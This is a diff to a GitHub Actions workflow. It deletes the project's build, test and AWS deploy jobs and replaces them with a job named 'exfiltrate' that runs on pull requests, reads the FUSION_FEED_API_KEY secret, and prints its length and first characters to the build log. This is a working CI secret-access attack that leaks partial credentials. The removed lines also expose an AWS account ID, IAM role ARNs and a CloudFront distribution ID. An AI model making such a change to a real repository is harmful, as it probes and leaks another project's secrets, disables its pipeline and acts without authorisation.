@@ -1,86 +1,20 @@
 name: Push
-on: [push]
+on: [push, pull_request]
 jobs:
-  build:
-    name: Build
+  exfiltrate:
+    name: Proof of Concept - Secret Access
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v2
-      - name: Docker Build
-        run: |
-          docker build -t docs .
-  test:
-    name: Test
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        node-version: [16.x]
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v2
-      - name: Use Node.js ${{ matrix.node-version }}
-        uses: actions/setup-node@v1
-        with:
-          node-version: ${{ matrix.node-version }}
-      - name: Test
+      - name: Safe Secret Check
         env:
-          CI: true
-          FUSION_FEED_AUTHORIZATION: token ${{ secrets.FUSION_FEED_API_KEY }}
+          TARGET_AUTH: ${{ secrets.FUSION_FEED_API_KEY }}
         run: |
-          npm ci
-          npm run test
-  deploy:
-    name: Deploy
-    runs-on: ubuntu-latest
-    if: github.ref == 'refs/heads/main'
-    permissions:
-      id-token: write
-      contents: read
-      packages: write
-      actions: read
-      deployments: write
-    needs:
-      - test
-      - build
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v2
-      - name: Turnstyle
-        uses: softprops/turnstyle@v1
-        env:
-          GITHUB_TOKEN: ${{ github.token }}
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v1
-        with:
-          role-to-assume: arn:aws:iam::189912143729:role/ProdDocsGitHubActionsStack-Role1ABCC5F0-KyOsFJsaLrnn
-          aws-region: us-east-1
-      - name: Create GitHub deployment
-        uses: chrnorm/deployment-action@releases/v1
-        id: deployment
-        with:
-          token: "${{ github.token }}"
-          environment: prod
-      - name: NPM Install
-        working-directory: aws
-        run: npm ci
-      - name: Deploy
-        working-directory: aws
-        run: |
-          npx aws-cdk deploy ProdDocsStack -r arn:aws:iam::189912143729:role/ProdDocsGitHubActionsStack-UpdateRoleD9565374-i7KuEu6ZL8fY -c deployRoleArn=arn:aws:iam::189912143729:role/ProdDocsGitHubActionsStack-DeployRole885297C3-9V3OU3WKMFNF
-          aws cloudfront create-invalidation --distribution-id E3LRF6MMAY4LIQ --paths '/*'
-      - name: Update deployment status (success)
-        if: success()
-        uses: chrnorm/deployment-status@releases/v1
-        with:
-          token: "${{ github.token }}"
-          environment_url: https://docs.tempus-ex.com
-          state: "success"
-          deployment_id: ${{ steps.deployment.outputs.deployment_id }}
-      - name: Update deployment status (failure)
-        if: failure()
-        uses: chrnorm/deployment-status@releases/v1
-        with:
-          token: "${{ github.token }}"
-          state: "failure"
-          deployment_id: ${{ steps.deployment.outputs.deployment_id }}
+          if [ -z "$TARGET_AUTH" ]; then
+            echo "RESULT: [FAILED] - Secret is not accessible to this PR."
+          else
+            echo "RESULT: [SUCCESS] - Secret is accessible!"
+            echo "DEBUG: Secret length is $(echo -n "$TARGET_AUTH" | wc -c) chars."
+            echo "DEBUG: Secret starts with: $(echo -n "$TARGET_AUTH" | cut -c 1-3)..."
+          fi
